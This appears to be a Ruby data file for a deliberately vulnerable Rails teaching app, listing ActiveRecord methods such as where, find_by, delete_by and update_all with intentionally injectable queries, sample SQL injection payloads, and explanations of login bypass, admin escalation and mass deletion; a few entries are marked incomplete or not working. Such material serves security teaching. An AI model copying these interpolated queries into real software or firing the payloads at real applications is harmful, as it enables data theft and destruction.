Queries = [
  {
    :action => :calculate,
    :name => "Calculate Methods (Count)",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Calculations.html#method-i-calculate",
    :query => "User.calculate(:count, payload[:column])",
    :input => {:name => :column, :example => "first_name) from users where is_admin=true;--"},
    :sql => "SELECT COUNT(users.'REPLACE') FROM users",
    :explanation => <<-MD
    The COUNT method is used here, but all of the calculate methods accept the name of the column as the second parameter.  That value is not escaped so if a request parameter is used here, the method will be vulnerable.
      MD
  },

  {
    :action => :delete_by,
    :name => "Delete By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-delete_by",
    :query => 'OrderProduct.delete_by("id = #{payload[:id]}")',
    :input => {:name => :id, :example => '1) OR 1=1--'},
    :sql => "DELETE FROM order_products WHERE (id = 'REPLACE')",
    :explanation => <<-MD
      This method effectively accepts a WHERE clause. Hashes will be encoded, so this method is only vulnerable if user-controlled data is directly incorporated into the clause.
    MD
  },

  {
    :action => :destroy_by,
    :name => "Destroy By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-destroy_by",
    :query => 'User.destroy_by(["id = ? AND is_admin = #{payload[:is_admin]}", params[:id]])',
    :input => {:name => :is_admin, :example => "false) OR 1=1 --"},
    :sql => "SELECT users.* FROM users WHERE (id = NULL AND is_admin = 'REPLACE')",
    :explanation => <<-MD
      This method effectively accepts a WHERE clause. Hashes will be encoded, so this method is only vulnerable if user-controlled data is directly incorporated into the clause.
    MD
  },

  {
    :action => :exists,
    :name => "Exists? Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-exists-3F",
    :query => 'User.exists?(["last_name LIKE \'#{payload[:user]}%%\'"])',
    :input => {:name => :user, :example => "' OR is_admin=true and first_name LIKE 'A" },
    :sql => "SELECT 1 AS one FROM users WHERE (last_name LIKE 'REPLACE%') LIMIT $1  [[\"LIMIT\", 1]]",
    :explanation => <<-MD
      Only vulnerable if an array is passed, but request parameters can sometimes be changed to arrays. Since the method will only ever return true or false, blind injection is the likely exploit path.
    MD
  },

  {
    :action => :find_by,
    :name => "Find By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-find_by",
    :query => 'User.find_by("first_name = \'#{payload[:first_name]}\' AND pw_hash = \'#{params[:password]}\'")',
    :input => {:name => :first_name, :example => "') OR 1=$1 --"},
    :sql => "SELECT users.* FROM users WHERE (first_name = 'REPLACE' AND pw_hash = '')",
    :explanation => <<-MD
      This method accepts a WHERE clause and will encode parameters if passed as a hash.  It is vulnerable if the user data is directly incorporated into the string. This example simulates a login query. Successfully, returning a user object would result in logging in as that user. 
    MD
  },

  {
    :action => :from_method,
    :name => "From Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-from",
    :query => "User.from(payload[:from]).where('is_admin IS NULL')",
    :input => {:name => :from, :example => "users WHERE admin = '1' OR ''=?;"},
    :explanation => "Instead of returning all non-admin users, we return all admin users.",
    :sql => 'REPLACE',
    :desc => <<-MD
      The 'from' method expects a table name, but does not encode the value. An application may populate a request paramter with a known good value and use it in this method forgetting that an attacker can modify all parameters sent to the server. This example is very contrived and the only valid (non-injection) input is "users".
    MD
  },

  {
    :action => :group_method,
    :name => "Group Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-group",
    :query => "OrderProduct.select(:quantity).group(payload[:group])",
    :input => {:name => :group, :example => "id from order_products where 99=$1;--"},
    :sql => "SELECT order_products.order_iq, sum(quantity) FROM order_products GROUP BY order_products.order_iq LIMIT $1",
    :explanation => <<-MD
      The group method accepts the field name to group by. Since grouping by a column that was not selected would result in an SQL error, rails automatically puts the value in both the SELECT and GROUP BY clauses.  Often this means injecting into the SELECT portion and commenting the rest of the automatic query will be easiest. Valid non-injection input for this field is order_id and product_id.
    MD
  },

  {
    :action => :having,
    :name => "Having Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-having",
    :query => 'Order.where(:user_id => 1).group(:user_id).having("total > #{payload[:total]}")',
    :input => {:name => :total, :example => "1) UNION SELECT * FROM orders--"},
    :sql => 'REPLACE',
    :explanation => <<-MD 
      METHOD INCOMPLETE - The having method is like a WHERE clause but it was designed to act on aggregator functions. A query with a HAVING clause must also have a GROUP BY clause. ????. Since grouping by a column that was not selected would result in an SQL error, rails automatically puts the value in both the SELECT and GROUP BY clauses.  Often this means injecting into the SELECT portion and commenting the rest of the automatic query will be easiest. Valid non-injection input for this field is order_id and product_id.
    MD
  },


  {
    :action => :joins,
    :name => "Joins Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-joins",
    :query => 'User.joins(payload[:table]).where("credit_card IS NULL").all',
    :input => {:name => :table, :example => "--"},
    :sql => 'REPLACE',
    :explanation => <<-MD
      Normally joins are handled automatically using the relationships defined in the models, however the joins method can be used to form a temporary relationship. The method expects a table name, but does not escape the value. Applications may set the table name on the client side and pass it as a request parameter. An attacker could tamper with that parameter to achieve injection. In this contrived example, on the value 'orders' would normally work.
    MD
  },

  {
    :action => :lock,
    :name => "Lock Method and Option",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-lock",
    :query => "User.where('id > 1').lock(payload[:lock])",
    :input => {:name => :lock, :example => "?"},
    :sql => "SELECT users.* FROM users WHERE (id > 1) LIMIT $1 'REPLACE'",
    :explanation => <<-MD
      The value is database dependent.  Unlikely to be a user controlled variable, but may be a hidden parameter designed to control behavior of different queries executed from the same form. Postgres values include FOR UPDATE, FOR SHARE, and FOR NO KEY UPDATE.  The value specified is directly appended to the end of the query, but after the LIMIT clause so it is too late for a UNION.  Can add OFFSET to select a different record than intended by the application e.g. OFFSET 1
    MD
  },

  {
    :action => :not,
    :name => "Not Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods/WhereChain.html#method-i-not",
    :query => 'User.where.not("is_admin = true OR id IN (#{payload[:excluded]})").all',
    :input => {:name => :excluded, :example => "1)) OR 1=1 --"},
    :sql => "SELECT users.* FROM users WHERE NOT (is_admin = true OR id IN ('REPLACE')) LIMIT $1",
    :explanation => <<-MD
      "Return all users, even if they are administrators.",
    MD
  },

  {
    :action => :select_method,
    :name => 'Select Method',
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-select",
    :query => 'User.select(payload[:column])',
    :input => {:name => :column, :example => "* FROM USERS WHERE 0!=$1; --"},
    :sql => "SELECT 'REPLACE' FROM users LIMIT $1",
    :explanation => <<-MD
      Since the `SELECT` clause is at the beginning of the query, nearly any SQL can be injected.
    MD
  },

  {
    :action => :reselect_method,
    :name => 'Reselect Method',
    :link => 'https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-reselect',
    :query => 'User.select(:name).reselect(payload[:column])',
    :input => {:name => :column, :example => "* FROM orders WHERE 0!=$1;-- "},
    :sql => "SELECT 'REPLACE' FROM users LIMIT $1",
    :explanation => <<-MD
      This is the same as `select`. Since the `SELECT` clause is at the beginning of the query, nearly any SQL can be injected, including querying totally different tables than intended.
    MD
  },

  {
    :action => :where,
    :name => "Where Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-where",
    :query => 'User.where("first_name = \'#{payload[:first_name]}\' AND pw_hash = \'SUBMITTED_PASSWORD\'")',
    :input => {:name => :first_name, :example => "') OR 1--"},
    :sql => "SELECT users.* FROM users WHERE (first_name = 'REPLACE' AND pw_hash = 'SUBMITTED_PASSWORD') LIMIT $1",
    :explanation => <<-MD
      The example below is using classic SQL injection to bypass authentication.
    MD
  },

  {
    :action => :rewhere,
    :name => "Rewhere Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-rewhere",
    :query => 'User.where(first_name: "Bob").rewhere("email LIKE \'#{payload[:search]}%\'")',
    :input => {:name => :search, :example => "a') OR 0!=$2--'"},
    :explanation => 'Adds a new clause to the statement connected using AND',
    :sql => "SELECT users.* FROM users WHERE users.first_name = $1 AND (email LIKE ''REPLACE'%') LIMIT $2",
  },

  {
    :action => :update_all_method,
    :name => "Update All Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-update_all",
    :query => 'User.update_all("is_admin = true WHERE id IN (#{payload[:id_list]})")',
    :input => {:name => :id_list, :example => '\' OR 1=1;'},
    :explanation => "Update every user to be an admin.",
    :sql => "UPDATE users SET is_admin = true WHERE id IN ('REPLACE')",
    :prob => "Generates correct SQL, but doesn't modify the databse"
  },
]
